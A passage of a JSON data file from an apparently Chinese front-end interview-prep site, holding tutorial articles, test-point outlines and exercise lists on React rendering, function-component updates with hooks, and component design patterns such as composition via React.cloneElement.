PureComponent } from 'react'\n\nexport default class App extends PureComponent {\n    state = { flag: false }\n\n    render() {\n        return (\n            <>\n                {\n                    this.state.flag ?\n                        <div>\n                            <input type=\"password\" />\n                            <button onClick={() => {\n                                this.setState({\n                                    flag: !this.state.flag\n                                })\n                            }}>显示/隐藏</button>\n                        </div>\n                        :\n                        <div>\n                            <input type=\"password\" />\n                            <input type=\"text\" />\n                            <button onClick={() => {\n                                this.setState({\n                                    flag: !this.state.flag\n                                })\n                            }}>显示/隐藏</button>\n\n                        </div>\n                }\n            </>\n        )\n    }\n}\n```\n\n![渲染原理.gif](https://static.ecool.fun//article/26606412-8aac-4f19-81de-aab8d6e3c033.awebp)\n\n从图中可以看到，我们输入了密码后，`重新渲染`生成了新的DOM，但是里面的密码还存在。这就很好的证明了`React`是如何重用`真实DOM`的。\n\n**一道面试题**\n\n```js\nimport React, { PureComponent } from 'react'\n\nclass ClassCompA extends PureComponent {\n    componentDidMount() {\n        console.log(\"111 ClassCompA componentDidMount\");\n    }\n\n    componentWillUnmount() {\n        console.log(\"222 ClassCompA componentWillUnmount\");\n    }\n\n    render() {\n        return (<div className=\"ClassCompA\"></div>)\n    }\n}\n\nclass ClassCompB extends PureComponent {\n    componentDidMount() {\n        console.log(\"333 ClassCompB componentDidMount\");\n    }\n\n    render() {\n        return (<div className=\"ClassCompB\">\n            <ClassCompC />\n        </div>)\n    }\n}\n\n\nclass ClassCompC extends PureComponent {\n    componentDidMount() {\n        console.log(\"444 ClassCompC componentDidMount\");\n    }\n\n    render() {\n        return (<div className=\"ClassCompC\"></div>)\n    }\n}\n\n\nexport default class App extends PureComponent {\n    state = {\n        flag: true,\n    }\n\n    componentDidMount(){\n        console.log(\"666 App componentDidMount\");\n    }\n\n    componentDidUpdate() {\n        console.log(\"555 App componentDidUpdate\");\n    }\n\n    render() {\n        return (\n            <div className=\"wrapper\">\n                {this.state.flag ? <ClassCompA/> : <ClassCompB/>}\n                <button onClick={() => {\n                    this.setState({\n                        flag: !this.state.flag\n                    })\n                }}>更新</button>\n            </div>\n        )\n    }\n}\n```\n\n**问：首次渲染和按下button控制台输出的顺序是什么？**\n\n看的仔细的同学，相信根本就难不倒你，我们一起来捋一捋。\n\n1.  首先，最外层的组件是`App`，所以开始`App`的挂载流程，运行`render`的过程中发现`条件渲染`先渲染`ClassCompA`。\n2.  进入`ClassCompA`的挂载流程，没啥好渲染的就一个div，执行完`render`后将`componentDidMount`加入到队列中等待执行。此时队列里是`[111]`。\n3.  `App`再针对初始元素`button`做处理后，`render`执行结束，将自己的`componentDidMount`加入到队列中等待执行，此时队列里是`[111、666]`。\n4.  `React`根据`虚拟节点`生成`真实DOM`后，保存`vDom`树，开始运行队列。此时控制台打印`111`、`666`。\n5.  按下`button`后，调用`setState`进行重新渲染，此时`App`还会运行两个生命周期方法 `getDerivedStateFromProps`和`shouldComponentUpdate`，然后运行`render`，生成新的`vDom`树。\n6.  进入新旧两棵树的`对比更新`，虽然都是`组件节点`，但生成出的实例不同，认为是不相同的`节点类型`。开始卸载旧节点`ClassCompA`，并将`ComponentWillUnMount`加入到执行队列，等待执行。此时队列`[222]`。\n7.  进入新节点挂载流程，创建`ClassCompB`实例，调用`render`生成`虚拟节点`。发现存在`组件节点ClassCompC`。再次进入到新节点挂载流程，创建实例。\n8.  `ClassComC`运行完`render`生成`vDom`树，将自己的`componentDidMount`加入到队列，等待将来执行。此时队列`[222、444]`。\n9.  挂载完`ClassComC`后，`ClassComB`的`render`才算结束，此时将自己的`componentDidMount`加入到队列，等待执行，此时队列`[222、444、333]`。\n10.  此时`App`的`render`才算结束，将自己的`componentDidUpdate`加入到队列，等待执行。此时队列`[222、444、333、555]`。\n11.  将根据`虚拟节点`生成的`真实DOM`挂载到页面上后，开始执行队列。控制台输出`222`、`444`、`333`、`555`。\n\n# 总结\n\n对于`生命周期`我们只需关注比较重要的几个生命周期的运行点即可，比如`render`的作用、使用`componentDidMount`在挂载完`真实DOM`后做一些副作用操作、以及性能优化点`shouldComponentUpdate`、还有卸载时利用`componentWillUnmount`清除副作用。\n\n对于`首次挂载`阶段，我们需要了解`React`的渲染流程是：通过我们书写的`初始元素`和一些其他`可以生成虚拟节点的东西`来生成`虚拟节点`。然后针对不同的节点类型去做不同的事情，最终将`真实DOM`挂载到页面上。然后执行渲染期间加入到队列的一些`生命周期`。然后组件进入到活跃状态。\n\n对于`更新卸载`阶段，需要注意的是有几个`更新的场景`。以及`key`的作用到底是什么。有或没有会产生多大的影响。还有一些小细节，比如`条件渲染`时，不要去破坏结构。尽量使用`空节点`来保持前后结构顺序的统一。重点是新旧两棵树的`对比更新流程`。找到目标，节点类型一致时针对不同的`节点类型`会做哪些事，类型不一致时会去`卸载`整个旧节点。无论有多少子节点，都会全部`递归`进行卸载。\n\n到这里，文章所有的部分就全部结束了，本文没有涉及到一行源码，全部都是总结出能在不看源码的情况下能大致了解整个`渲染流程`。为了减少混淆，也没有涉及到`Hooks`以及`Fiber`的概念，有兴趣的同学可以留言，可以考虑下次出一篇。最后，再喝一口水休息一下。对本文内容有异议或交流欢迎评论～\n\n![](https://static.ecool.fun//article/bc455740-42ad-4ac0-a34a-79c299ecf903.awebp)\n\n我正在参与掘金技术社区创作者签约计划招募活动，[点击链接报名投稿](https://juejin.cn/post/7112770927082864653 \"https://juejin.cn/post/7112770927082864653\")。",
    "testPoint": "## 一、渲染机制的基本流程\n\n从调用组件到页面展示，React 渲染经历以下阶段：\n\n1. **初始渲染阶段**\n\n   * JSX 被编译成 React 元素（虚拟 DOM）\n   * 构建 Fiber 树，执行组件函数或类的 `render` 方法\n   * 生成更新对象（Update）\n   * 将变更应用到真实 DOM\n\n2. **更新阶段（Reconciliation 协调）**\n\n   * 触发更新（如 `setState`）\n   * 比较前后两棵 Fiber 树（Diff 算法）\n   * 标记需要变更的节点\n   * 生成更新队列（Update Queue）\n   * 提交（Commit）到真实 DOM\n\n## 二、具体考察点\n\n### 1. **React 的虚拟 DOM（VDOM）**\n\n* React 为什么使用虚拟 DOM？\n* 虚拟 DOM 和真实 DOM 有什么区别？\n* 什么时候更新虚拟 DOM？性能如何？\n\n### 2. **Fiber 架构**\n\n* Fiber 是什么？和旧的 Stack Reconciler 有何区别？\n* Fiber 架构如何实现可中断渲染？\n* 每个 Fiber 节点包含哪些信息？\n* 什么是 “work in progress” Fiber 树？\n\n### 3. **协调（Reconciliation）过程**\n\n* React 是如何比较新旧节点的？\n* diff 算法的优化原则是什么？\n\n  * 同层比较\n  * Key 的作用\n* 什么情况下组件会被重用或销毁？\n\n### 4. **调度机制**\n\n* React 18 引入了什么调度特性？\n\n  * 并发模式（Concurrent Mode）\n  * 时间分片（Time Slicing）\n  * `startTransition`、`useDeferredValue`\n* React 如何确定任务的优先级？\n* 任务调度与浏览器帧调度的关系？\n\n### 5. **commit 阶段**\n\n* commit 阶段是否可中断？为什么？\n* 生命周期函数在 commit 阶段的触发顺序？\n* 为什么更新是分为 “render 阶段” 和 “commit 阶段”？\n\n### 6. **渲染优化**\n\n* 如何避免不必要的组件更新？\n\n  * `React.memo`\n  * `shouldComponentUpdate`\n  * `useMemo` / `useCallback`\n* 如何使用 Key 减少 diff 损耗？\n* React.lazy 和 Suspense 如何实现异步加载？\n\n## 三、与 Hooks 相关的渲染机制\n\n### 1. useState / useReducer\n\n* 状态更新是同步还是异步？\n* 多次 setState 会合并吗？\n* 更新是批量处理的吗？\n\n### 2. useEffect / useLayoutEffect\n\n* 两者在渲染机制中的执行时机是什么？\n* 为什么说 useEffect 是异步执行的？\n\n### 3. 渲染行为相关 Hooks\n\n* `useInsertionEffect`、`useTransition`、`useDeferredValue` 的作用和时机？\n\n## 四、React 的重新渲染触发机制\n\n* 哪些行为会触发重新渲染？\n\n  * props 改变\n  * state 改变\n  * context 改变\n* 父组件重新渲染是否一定导致子组件更新？\n* 如何避免子组件因为 props 变化重新渲染？\n\n## 五、调试与性能分析工具\n\n* 如何使用 React DevTools 分析组件渲染？\n* 如何使用 Profiler 定位性能瓶颈？\n* 如何查看组件是否因为 props 或 state 改变而重新渲染？\n",
    "exerciseKeyList": "[\"212673c7-7ea1-460a-b44f-2e3fe20f3397\",\"0367ccd1-0db1-411e-865a-36ec2e7e2048\",\"8ebf476c-a776-49a1-a8b7-7eae37237cb2\",\"2e8431e4-baf7-4b7e-bb9a-5960433e4fa2\",\"bd1d3517-7b88-46a3-a077-6865e0b96b27\",\"84265789-cf7a-4d95-b724-665234c6eb10\",\"d6aa767b-f4e2-4200-ac29-22f5f1759021\",\"f317438d-44bf-4476-8f9d-b1e51521fa20\",\"7830d575-2143-47c3-b938-2f9448a7465e\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T10:16:34.000Z",
    "updateAt": "2025-07-16T11:30:02.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0367ccd1-0db1-411e-865a-36ec2e7e2048",
        "title": "React Reconciler 为何要采用 fiber 架构？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:04:53.000Z"
      },
      {
        "exerciseKey": "212673c7-7ea1-460a-b44f-2e3fe20f3397",
        "title": "简单介绍下React中的 diff 算法\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:59:54.000Z",
        "updateAt": "2024-08-10T17:05:00.000Z"
      },
      {
        "exerciseKey": "2e8431e4-baf7-4b7e-bb9a-5960433e4fa2",
        "title": "说说Fiber的含义与数据结构",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:08:13.000Z"
      },
      {
        "exerciseKey": "7830d575-2143-47c3-b938-2f9448a7465e",
        "title": "React Fiber是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:01:06.000Z",
        "updateAt": "2024-08-10T17:04:58.000Z"
      },
      {
        "exerciseKey": "84265789-cf7a-4d95-b724-665234c6eb10",
        "title": "为什么 react 需要 fiber 架构，而 Vue 却不需要？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-02-26T03:06:17.000Z",
        "updateAt": "2024-08-10T17:07:39.000Z"
      },
      {
        "exerciseKey": "8ebf476c-a776-49a1-a8b7-7eae37237cb2",
        "title": "fiber 架构的工作原理？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:07:12.000Z"
      },
      {
        "exerciseKey": "bd1d3517-7b88-46a3-a077-6865e0b96b27",
        "title": "React 中，fiber 是如何实现时间切片的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:13:20.000Z"
      },
      {
        "exerciseKey": "d6aa767b-f4e2-4200-ac29-22f5f1759021",
        "title": "React Fiber 是如何实现更新过程可控？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-07T09:11:42.000Z",
        "updateAt": "2024-08-10T17:05:40.000Z"
      },
      {
        "exerciseKey": "f317438d-44bf-4476-8f9d-b1e51521fa20",
        "title": "Fiber 为什么是 React 性能的一个飞跃？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-07T09:03:35.000Z",
        "updateAt": "2024-08-10T17:05:39.000Z"
      }
    ]
  },
  "212": {
    "id": 212,
    "tagId": 13,
    "title": "React函数组件更新",
    "explanation": "React的函数组件（Function Components）自Hooks推出以来已成为React开发的主流方式。理解函数组件的更新原理对于编写高效、可维护的React应用至关重要。本文将深入探讨React函数组件的更新机制。\n\n## 一、函数组件与类组件的本质区别\n\n在深入更新原理前，我们需要明确函数组件与类组件的根本区别：\n\n- **类组件**：是类的实例，拥有实例属性和生命周期方法\n- **函数组件**：是纯函数，接收props作为参数，返回JSX\n\n这种本质区别决定了它们的更新行为完全不同。\n\n## 二、函数组件的执行机制\n\n当React需要渲染一个函数组件时，它只是简单地**调用这个函数**：\n\n```jsx\nfunction MyComponent(props) {\n  return <div>{props.message}</div>;\n}\n\n// React内部大致这样处理\nconst element = MyComponent({ message: 'Hello' });\n```\n\n每次渲染都是**全新的函数调用**，所有局部变量和函数都会重新创建。这与类组件形成鲜明对比，类组件在更新时会复用同一个实例。\n\n## 三、触发更新的场景\n\n函数组件的更新主要由以下情况触发：\n\n1. **父组件重新渲染**：即使props未变化，父组件渲染也会导致子组件重新渲染\n2. **props发生变化**：当传入组件的props值改变时\n3. **状态更新**：通过useState、useReducer等Hook更新状态\n4. **context变化**：组件订阅的context值发生变化\n5. **Hooks依赖变化**：useEffect、useMemo等Hook的依赖项发生变化\n\n## 四、React的渲染流程\n\n函数组件的更新遵循React的渲染流程：\n\n1. **触发更新**：通过setState、父组件渲染等途径触发更新\n2. **协调阶段（Reconciliation）**：\n   - React调用函数组件获取新的JSX\n   - 与上一次渲染的JSX进行对比（Virtual DOM Diff）\n3. **提交阶段（Commit）**：\n   - 将差异应用到真实DOM\n   - 执行useLayoutEffect的回调\n4. **浏览器绘制**：浏览器重绘屏幕\n5. **副作用执行**：执行useEffect的回调\n\n## 五、Hooks与组件更新\n\nHooks是函数组件能够拥有状态和生命周期的关键。理解Hooks的工作机制对理解组件更新至关重要。\n\n### useState的工作原理\n\n```jsx\nconst [count, setCount] = useState(0);\n```\n\n- React会在组件首次渲染时为每个useState调用分配一个\"状态单元\"\n- 后续更新时，React会按照Hooks的调用顺序来提供对应的状态值\n- setCount调用会触发组件的重新渲染\n\n### useEffect与更新\n\n```jsx\nuseEffect(() => {\n  // 副作用代码\n  return () => {\n    // 清理函数\n  };\n}, [dependencies]);\n```\n\n- 组件每次渲染后，React会比较依赖项数组\n- 如果依赖项变化或没有提供依赖项数组，副作用会重新执行\n- 清理函数会在副作用重新执行前或组件卸载时执行\n\n## 六、优化更新性能\n\n由于函数组件每次更新都会完整执行函数体，我们需要一些优化手段：\n\n### React.memo\n\n```jsx\nconst MyComponent = React.memo(function MyComponent(props) {\n  /* 使用props渲染 */\n});\n```\n\nReact.memo会对props进行浅比较，避免不必要的重新渲染。\n\n### useMemo\n\n```jsx\nconst memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);\n```\n\nuseMemo可以缓存计算结果，避免每次渲染都重新计算。\n\n### useCallback\n\n```jsx\nconst memoizedCallback = useCallback(() => {\n  doSomething(a, b);\n}, [a, b]);\n```\n\nuseCallback可以缓存函数引用，避免子组件因函数引用变化而重新渲染。\n\n## 七、闭包陷阱\n\n函数组件更新时的一个常见问题是\"过时闭包\"：\n\n```jsx\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  useEffect(() => {\n    const id = setInterval(() => {\n      // 这里的count永远是最初的值\n      setCount(count + 1);\n    }, 1000);\n    return () => clearInterval(id);\n  }, []); // 空依赖数组\n\n  return <h1>{count}</h1>;\n}\n```\n\n解决方案是使用函数式更新或添加依赖：\n\n```jsx\nsetCount(c => c + 1); // 函数式更新\n```\n\n或者\n\n```jsx\nuseEffect(() => {\n  const id = setInterval(() => {\n    setCount(count + 1);\n  }, 1000);\n  return () => clearInterval(id);\n}, [count]); // 添加count依赖\n```\n\n## 八、并发模式下的更新\n\nReact 18引入了并发特性，更新机制变得更加复杂：\n\n- **自动批处理**：多个状态更新会自动批处理，减少渲染次数\n- **过渡更新**：使用startTransition标记非紧急更新\n- **Suspense**：组件可以\"暂停\"渲染等待数据\n\n这些特性使React能够优先处理用户交互等紧急更新，提升用户体验。\n\n## 九、总结\n\nReact函数组件的更新原理可以概括为：\n\n1. 每次更新都是全新的函数调用\n2. Hooks维护了组件的状态和行为\n3. React通过协调算法高效更新DOM\n4. 优化手段可以避免不必要的计算和渲染\n5. 理解闭包陷阱对编写正确代码至关重要\n6. 并发模式带来了更智能的更新调度\n\n深入理解这些原理，可以帮助开发者编写更高效、更可靠的React应用。",
    "testPoint": "1. **函数组件的初次渲染**：\n   - 请简述React函数组件的初次渲染过程。\n   - 在初次渲染过程中，React是如何处理函数组件的输入（props）和状态（state，如果有的话）的？\n\n2. **函数组件的更新触发**：\n   - 哪些因素会触发React函数组件的更新？\n   - 当props或内部状态（如通过useState钩子创建的状态）发生变化时，React是如何检测到这些变化的？",
    "exerciseKeyList": "[\"ac4eefb4-3602-4ae1-874a-148f7f0b2601\",\"9917e299-4991-4ceb-bc54-693533bd9659\",\"9491596e-4423-4426-b300-a31ded121bc1\",\"672716f5-203b-4928-afdc-44d6e8793663\",\"207b117b-2e93-4760-91ed-8e618a85a50e\",\"702b094e-0bdc-4be6-b8c7-e2a70dc13688\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-12-17T10:19:43.000Z",
    "updateAt": "2025-07-16T11:43:57.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "207b117b-2e93-4760-91ed-8e618a85a50e",
        "title": "下面函数组件的输出分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-16T11:25:49.000Z",
        "updateAt": "2024-07-23T10:20:38.000Z"
      },
      {
        "exerciseKey": "672716f5-203b-4928-afdc-44d6e8793663",
        "title": "为什么不能在循环、条件或嵌套函数中调用 Hooks？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-05-29T12:58:22.000Z",
        "updateAt": "2024-08-10T17:06:41.000Z"
      },
      {
        "exerciseKey": "702b094e-0bdc-4be6-b8c7-e2a70dc13688",
        "title": "React中的类组件和函数组件之间有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:42:25.000Z",
        "updateAt": "2024-08-10T17:04:54.000Z"
      },
      {
        "exerciseKey": "9491596e-4423-4426-b300-a31ded121bc1",
        "title": "讲讲 React.memo 和 JS 的 memorize 函数的区别",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-10-10T12:42:24.000Z",
        "updateAt": "2024-07-23T10:14:12.000Z"
      },
      {
        "exerciseKey": "9917e299-4991-4ceb-bc54-693533bd9659",
        "title": "如果在 useEffect 的第一个参数中 return 了一个函数，那么第二个参数分别传空数组和传依赖数组，该函数分别是在什么时候执行？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-28T03:40:01.000Z",
        "updateAt": "2024-07-23T09:47:54.000Z"
      },
      {
        "exerciseKey": "ac4eefb4-3602-4ae1-874a-148f7f0b2601",
        "title": "怎么获取函数组件的实例？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:52:44.000Z"
      }
    ]
  },
  "213": {
    "id": 213,
    "tagId": 13,
    "title": "react 组件设计模式",
    "explanation": "首先我们想一个问题，那就是 **为什么要学习设计模式？** 原因我总结有以下几个方面。\n\n**1. 功能复杂，逻辑复用问题。**\n\n首先 React 灵活多变性，就决定了 React 项目可以应用多种设计模式。但是这些设计模式的产生也确实办了实事:\n\n* **场景一：**\n\n在一个项目中，全局有一个状态，可以称之为 theme （主题），那么有很多 UI 功能组件需要这个主题，而且这个主题是可以切换的，就像 github 切换暗黑模式一样，那么如何优雅的实现这个功能呢？\n\n这个场景如果我们用 React 的**提供者模式**，就能轻松搞定了，通过 `context` 保存全局的主题，然后将 `theme` 通过 `Provider` 形式传递下去，需要 theme ，那么消费 context ，就可以了，这样的好处是，只要 theme 改变，消费 context 的组件就会重新更新，达到了切换主题的目的。\n\n* **场景二：**\n\n表单设计场景也需要一定程度上的 React 的设计模式，首先对于表单状态的整体验证需要外层的 `Form` 绑定事件控制，调度表单的状态下发，验证功能。内层对于每一个表单控件还需要 `FormItem` 收集数据，让控件变成受控的。 这样的 `Form` 和 `FormItem` 方式，就是通过**组合模式**实现的。\n\n**2. 培养设计能力，编程能力**\n\n熟练运用 React 的设计模式，可以培养开发者的设计能力，比如 **`HOC` 的设计** ，**公共组件的设计** ，**自定义 hooks 的设计**，一些开源的优秀的库就是通过 React 的灵活性和优秀的设计模式实现的。\n\n* **例子：**\n\n比如在 React 状态管理工具中，无论是 `react-redux` ，还是 `mobx-react`，一方面想要把 `state` 和 `dispatch` 函数传递给组件，另一方面订阅 state 变化，来促使业务组件更新，那么整个流程中，需要一个或多个 HOC 来搞定。于是 react-redux 提供了 `connect`，mobx-react 提供了 `inject` ，`observer` 等优秀的 hoc。由此可见，学会 React 的设计模式，有助于开发者小到编写公共组件，大到开发开源项目。\n\n今天重点介绍 React 的五种设计模式，分别是：\n\n+   组合模式\n+   render props模式\n+   hoc 模式\n+   提供者模式\n+   类组件继承\n\n## 组合模式\n\n### 1 介绍\n\n组合模式适合一些容器组件场景，通过外层组件包裹内层组件，这种方式在 Vue 中称为 slot 插槽，外层组件可以轻松的获取内层组件的 `props` 状态，还可以控制内层组件的渲染，组合模式能够直观反映出 父 -> 子组件的包含关系，首先我来举个最简单的组合模式例子🌰。\n\n```js\n<Tabs onChange={ (type)=> console.log(type)  } >\n    <TabItem name=\"react\"  label=\"react\" >React</TabItem>\n    <TabItem name=\"vue\" label=\"vue\" >Vue</TabItem>\n    <TabItem name=\"angular\" label=\"angular\"  >Angular</TabItem>\n</Tabs>\n```\n\n如上 `Tabs` 和 `TabItem` 组合，构成切换 tab 功能，那么 Tabs 和 TabItem 的分工如下：\n\n+   Tabs 负责展示和控制对应的 TabItem 。绑定切换 tab 回调方法 onChange。当 tab 切换的时候，执行回调。\n+   TabItem 负责展示对应的 tab 项，向 Tabs 传递 props 相关信息。\n\n我们直观上看到 Tabs 和 TabItem 并没有做某种关联，但是却无形的联系起来。这种就是组合模式的精髓所在，这种组合模式的组件，给使用者感觉很舒服，因为大部分工作，都在开发组合组件的时候处理了。所以编写组合模式的嵌套组件，对锻炼开发者的 React 组件封装能力是很有帮助的。\n\n接下来我们一起看一下，组合模式内部是如何实现的。\n\n### 2 原理揭秘\n\n实际组合模式的实现并没有想象中那么复杂，主要分为外层和内层两部分，当然可能也存在多层组合嵌套的情况，但是万变不离其宗，原理都是一样的。首先我们看一个简单的组合结构：\n\n```js\n<Groups>\n    <Item  name=\"《React进阶实践指南》\" />\n</Groups>\n```\n\n#### 那么 `Groups` 能对 `Item` 做一些什么操作呢 ？\n\n**Item 在 Groups的形态**\n\n首先如果如上组合模式的写法，会被 `jsx` 编译成 `React element` 形态，`Item` 可以通过 `Groups` 的 **props.children** 访问到。\n\n```js\nfunction Groups (props){\n    console.log( props.children  ) // Groups element\n    console.log( props.children.props ) // { name : 'React进阶实践指南》' }\n    return  props.children\n}\n```\n\n但是这是针对单一节点的情况，事实情况下，外层容器可能有多个子组件的情况。\n\n```js\n<Groups>\n    <Item  name=\"《React进阶实践指南》\" />\n    <Item name=\"《Nodejs深度学习手册》\" />\n</Groups>\n```\n\n这种情况下，props.children 就是一个数组结构，如果想要访问每一个的 props ，那么需要通过 `React.Children.forEach` 遍历 props.children。\n\n```js\nfunction Groups (props){\n    console.log( props.children  ) // Groups element\n    React.Children.forEach(props.children,item=>{\n        console.log( item.props )  //依次打印 props\n    })\n    return  props.children\n}\n```\n\n**隐式混入 props**\n\n这个是组合模式的精髓所在，就是可以通过 React.cloneElement 向 children 中混入其他的 props，那么子组件就可以使用容器父组件提供的**特有的** props 。我们来看一下具体实现：\n\n```js\nfunction Item (props){\n    console.log(props) // {name: \"《React进阶实践指南》\", author: \"alien\"}\n    return <div> 名称： {props.name} </div>\n}\n\nfunction Groups (props){\n    const newChilren = React.cloneElement(props.children,{ author:'alien' })\n    return  newChilren\n}\n```\n\n+   用 `React.cloneElement` 创建一个新的 element，然后混入其他的 props -> author 属性，React.cloneElement 的第二个参数，会和之前的 props 进行合并 （ merge ）。\n\n这里还是 Groups 只有单一节点的情况，有些同学会问直接在原来的 children 基础上加入新属性不就可以了吗？ 像如下这样：\n\n```js\nprops.children.props.author = 'alien'\n```\n\n+   这样会报错，对于 props ，React 会进行保护，我们无法对 props 进行拓展。所以要想隐式混入 props ，只能通过 `cloneElement` 来实现。\n\n**控制渲染**\n\n组合模式可以通过 children 方式获取内层组件，也可以根据内层组件的状态来控制其渲染。比如如下的情况：\n\n```js\nexport default ()=>{\n    return <Groups>\n    <Item  isShow name=\"《React进阶实践指南》\" />\n    <Item  isShow={false} name=\"《Nodejs深度学习手册》\" />\n    <div>hello,world</div>\n    { null }\n</Groups>\n}\n```\n\n+   如上这种情况组合模式，只渲染 `isShow = true` 的 Item 组件。那么外层组件是如何处理的呢？\n\n实际处理这个很简单，也是通过遍历 children ，然后通过对比 props ，选择需要渲染的 children 。 接下来一起看一下如何控制：\n\n```js\nfunction Item (props){\n    return <div> 名称： {props.name} </div>\n}\n/* Groups 组件 */\nfunction Groups (props){\n    const newChildren = []\n    React.Children.forEach(props.children,(item)=>{\n        const { type ,props } = item || {}\n        if(isValidElement(item) && type === Item && props.isShow  ){\n            newChildren.push(item)\n        }\n    })\n    return  newChildren\n}\n```\n\n+   通过 `newChildren` 存放满足要求的 React Element ，通过 `Children.forEach` 遍历 children 。\n+   通过 `isValidElement` 排除非 element 节点；`type`指向 `Item`函数内存，排除非 Item 元素；获取 isShow 属性，只展示 isShow = true 的 `Item`，最终效果满足要求。\n\n**内外层通信**\n\n组合模式可以轻松的实现内外层通信的场景，原理就是通过外层组件，向内层组件传递回调函数 `callback` ，内层通过调用 `callback` 来实现两层组合模式的通信关系。\n\n```js\nfunction Item (props){\n    return <div>\n        名称：{props.name}\n        <button onClick={()=> props.callback('let us learn React!')} >点击</button>\n    </div>\n}\n\nfunction Groups (props){\n    const handleCallback = (val) =>  console.log(' children 内容：',val )\n    return <div>\n        {React.cloneElement( props.children , { callback:handleCallback } )}\n    </div>\n}\n```\n\n+   `Groups` 向 `Item` 组件中隐式传入回调函数 `callback`，将作为新的 props 传递。\n+   `Item` 可以通过调用 `callback` 向 `Groups`传递信息。实现了内外层的通信。\n\n**复杂的组合场景**\n\n组合模式还有一种场景，在外层容器中，进行再次组合，这样组件就会一层一层的包裹，一次又一次的强化。这里举一个例子：\n\n```js\nfunction Item (props){\n    return <div>\n        名称：{props.name}     <br/>\n        作者：{props.author}   <br/>\n        对大家说：{props.mes}   <br/>\n    </div>\n}\n/* 第二层组合 -> 混入 mes 属性  */\nfunction Wrap(props){\n    return React.cloneElement( props.children,{ mes:'let us learn React!' } )\n}\n/* 第一层组合，里面进行第二次组合，混入 author 属性  */\nfunction Groups (props){\n    return <Wrap>\n        {React.cloneElement( props.children, { author:'alien' } )}\n    </Wrap>\n}\n\nexport default ()=>{\n    return <Groups>\n    <Item name=\"《React进阶实践指南》\" />\n</Groups>\n}\n```\n\n+   在 `Groups` 组件里通过 `Wrap` 再进行组合。经过两次组合，把 `author` 和 `mes` 混入到 props 中。\n\n![1.jpg](https://static.ecool.fun//article/4264b826-ece9-4994-9500-be5a8c5039e3.awebp)\n\n这种组合模式能够一层层强化原始组件，外层组件不用过多关心内层到底做了些什么? 只需要处理 children 就可以，同样内层 children 在接受业务层的 props 外，还能使用来自外层容器组件的**状态**，**方法**等。\n\n### 3 注意细节\n\n组合模式也有很多细节值得注意，首先最应该想到的就是对于 `children` 的类型校验，因为组合模式，外层容器组件对 `children` 的属性状态是未知的。如果在不确定 `children` 的状态下，如果直接挂载，就会出现报错等情况。所以验证 children 的合法性就显得非常重要。\n\n**验证children**\n\n比如如下，本质上形态是属于 render props 形式。\n\n```js\n<Groups>\n   {()=>  <Item  isShow name=\"《React进阶实践指南》\" />}\n</<Groups>\n```\n\n上面的情况，如果 Groups 直接用 children 挂载的话。\n\n```js\nfunction Groups (props){\n    return props.children\n}\n```\n\n这样的情况，就会报 `Functions are not valid as a React child` 的错误。那么需要在 Groups 做判断，我们来一起看一下：\n\n```js\nfunction Groups (props){\n    return  React.isValidElement(props.children)\n     ? props.children\n     : typeof props.children === 'function' ?\n       props.children() : null\n}\n```\n\n+   首先判断 children 是否是 React.element ，如果是那么直接渲染，如果不是，那么接下来判断是否是函数，如果是函数，那么直接函数，如果不是那么直接渲染 `null` 就可以了。\n\n**绑定静态属性**\n\n现在还有一个暴露的问题是，外层组件和内层组件通过什么识别身份呢？ 比如如下的场景：\n\n```js\n<Groups>\n   <Item  isShow name=\"《React进阶实践指南》\" />\n   <Text />\n<Groups>\n```\n\n如下，`Groups` 内部有两个组件，一个是 `Item` ，一个是 `Text` ，但是只有 `Item` 是有用的，那么如何证明 Item 组件呢。那么我们需要给组件函数或者类绑定静态属性，这里可以统一用 **`displayName`** 来标记组件的身份。\n\n那么只需要这么做就可以了：\n\n```js\nfunction Item(){ ... }\nItem.displayName = 'Item'\n```\n\n那么在 Groups 中就可以找到对应的 Item 组件，排除 Text 组件。具体可以通过 children 上的 `type` 属性找到对应的函数或者是类，然后判断 type 上的 displayName 属性找到对应的 Item 组件，**本质上 displayName 主要用于调试，这里要记住组合方式，可以使用子组件的静态属性就可以了。** 当然也可以通过内存空间相同的方式。\n\n具体参考方式：\n\n```js\nfunction Groups (props){\n    const newChildren = []\n    React.Children.forEach(props.children,(item)=>{\n        const { type ,props } = item || {}\n        if(isValidElement(item) && type.displayName === 'Item' ){\n            newChildren.push(item)\n        }\n    })\n    return  newChildren\n}\n```\n\n通过 displayName 属性找到 Item。\n\n### 4 实践demo\n\n接下来，我们来简单实现刚开始的 tab，tabItem 切换功能。\n\n**tab实现**\n\n```js\nconst Tab = ({ children ,onChange }) => {\n    const activeIndex = useRef(null)\n    const [,forceUpdate] = useState({})\n    /* 提供给 tab 使用  */\n    const tabList = []\n    /* 待渲染组件 */\n    let renderChildren = null\n    React.Children.forEach(children,(item)=>{\n        /* 验证是否是 <TabItem> 组件  */\n        if(React.isValidElement(item) && item.type.displayName === 'tabItem' ){\n            const { props } = item\n            const { name, label } = props\n            const tabItem = {\n                